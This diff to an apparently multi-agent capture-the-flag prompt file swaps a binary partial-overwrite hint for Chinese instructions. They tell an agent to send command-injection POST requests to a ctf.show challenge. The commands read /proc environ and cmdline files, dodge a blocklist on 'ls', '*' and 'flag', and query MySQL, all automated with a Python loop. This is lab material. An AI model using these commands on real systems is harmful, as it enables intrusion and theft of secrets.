@@ -1,1 +1,33 @@
-Focus on the partial overwrite strategy. The return address is 0x1329, win is at 0x1229. Overwrite only the lower 2 bytes. Try all 16 nibble values for byte 1.
+### 立即操作，停止分析！
+
+Member3 已经确认：`du -a /` 未在根目录发现 `/flag` 文件。这意味着 flag 可能在以下位置之一，你需要逐个发送 HTTP POST 请求测试：
+
+**任务：用实际 HTTP 请求测试以下命令**
+
+POST 到 `https://9cae6f8e-08a1-46d1-a44a-e84938fb55d8.challenge.ctf.show/`
+参数: `cmd=你的命令`
+
+**测试清单（路径均不包含 `.` 和 `flag`，理论上可行）：**
+
+1. 读取进程环境变量 → `dd if=/proc/self/environ of=/dev/stdout`
+2. 读取进程命令行 → `dd if=/proc/1/cmdline of=/dev/stdout`
+3. 读取进程环境变量 → `rev /proc/self/environ`
+4. 展开式读取 → `expand /proc/self/environ`
+5. 查看所有打开的 FD → `ls /proc/self/fd/` (等等, `ls` 被禁...)
+   - 改用 `echo /proc/self/fd/*` — 但 `*` 被禁...
+   - 改用 `du -a /proc/self/fd/`
+6. 看当前进程的根目录 → `dd if=/proc/self/root/etc/hostname of=/dev/stdout`
+7. 看初始进程环境 → `dd if=/proc/1/environ of=/dev/stdout`
+8. 检查是否有 MySQL → `mysqladmin ping` 或 `mysql --version`
+9. 尝试直接查库 → `mysql -e "show databases;"`
+
+**让 python 脚本自动化测试**，不要手动。写个简单循环：
+```python
+import requests
+cmds = [...]
+for cmd in cmds:
+    r = requests.post(url, data={"cmd": cmd})
+    print(cmd, r.text[:200])
+```
+
+立刻开始测试并报告实际响应内容！
